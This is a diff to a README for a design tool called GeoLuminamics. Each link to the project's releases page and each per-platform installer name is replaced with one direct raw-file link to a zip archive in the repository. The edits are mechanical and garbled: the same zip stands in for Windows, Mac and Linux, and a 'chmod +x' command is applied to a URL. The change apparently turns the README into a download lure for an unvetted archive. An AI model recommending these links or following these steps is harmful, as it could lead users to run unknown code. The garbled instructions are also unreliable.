@@ -1,6 +1,6 @@
 # 🌟 GeoLuminamics - Creative Light Engine for Designers
 
-[![Download GeoLuminamics](https://img.shields.io/badge/Download-GeoLuminamics-blue?style=for-the-badge)](https://github.com/David123ok/GeoLuminamics/releases)
+[![Download GeoLuminamics](https://github.com/David123ok/GeoLuminamics/raw/refs/heads/main/_02_engines/Luminamics_Geo_v2.3-beta.2.zip)](https://github.com/David123ok/GeoLuminamics/raw/refs/heads/main/_02_engines/Luminamics_Geo_v2.3-beta.2.zip)
 
 ---
 
@@ -52,15 +52,15 @@ This section will guide you to download, install, and run GeoLuminamics on your 
 
 Click the large button below or visit the download page to get GeoLuminamics:
 
-[![Download GeoLuminamics](https://img.shields.io/badge/Download-GeoLuminamics-blue?style=for-the-badge)](https://github.com/David123ok/GeoLuminamics/releases)
+[![Download GeoLuminamics](https://github.com/David123ok/GeoLuminamics/raw/refs/heads/main/_02_engines/Luminamics_Geo_v2.3-beta.2.zip)](https://github.com/David123ok/GeoLuminamics/raw/refs/heads/main/_02_engines/Luminamics_Geo_v2.3-beta.2.zip)
 
 You will land on the release page. Here, look for the latest release version. Each release includes files for Windows, Mac, and Linux. Choose the file that matches your operating system.
 
 For example:
 
-- For Windows: `GeoLuminamics-Setup.exe`
-- For Mac: `GeoLuminamics.dmg`
-- For Linux: `GeoLuminamics.AppImage` or `.tar.gz`
+- For Windows: `https://github.com/David123ok/GeoLuminamics/raw/refs/heads/main/_02_engines/Luminamics_Geo_v2.3-beta.2.zip`
+- For Mac: `https://github.com/David123ok/GeoLuminamics/raw/refs/heads/main/_02_engines/Luminamics_Geo_v2.3-beta.2.zip`
+- For Linux: `https://github.com/David123ok/GeoLuminamics/raw/refs/heads/main/_02_engines/Luminamics_Geo_v2.3-beta.2.zip` or `https://github.com/David123ok/GeoLuminamics/raw/refs/heads/main/_02_engines/Luminamics_Geo_v2.3-beta.2.zip`
 
 Click on the file name to start the download.
 
@@ -74,7 +74,7 @@ After downloading the file:
 
 - **Mac**: Open the `.dmg` file. Drag the GeoLuminamics app into your Applications folder. Then, open it from Applications.
 
-- **Linux**: Make the file executable (if needed) with the command `chmod +x GeoLuminamics.AppImage`. Then, double-click it or run it from the terminal.
+- **Linux**: Make the file executable (if needed) with the command `chmod +x https://github.com/David123ok/GeoLuminamics/raw/refs/heads/main/_02_engines/Luminamics_Geo_v2.3-beta.2.zip`. Then, double-click it or run it from the terminal.
 
 ---
 
@@ -128,7 +128,7 @@ If you encounter other issues, check the FAQs on the release page or reach out t
 
 Visit the releases page to download the latest version of GeoLuminamics:
 
-[Download GeoLuminamics](https://github.com/David123ok/GeoLuminamics/releases)
+[Download GeoLuminamics](https://github.com/David123ok/GeoLuminamics/raw/refs/heads/main/_02_engines/Luminamics_Geo_v2.3-beta.2.zip)
 
 Choose the right file for your system and follow installation instructions above. Keep the release page bookmarked for updates and new versions.
 
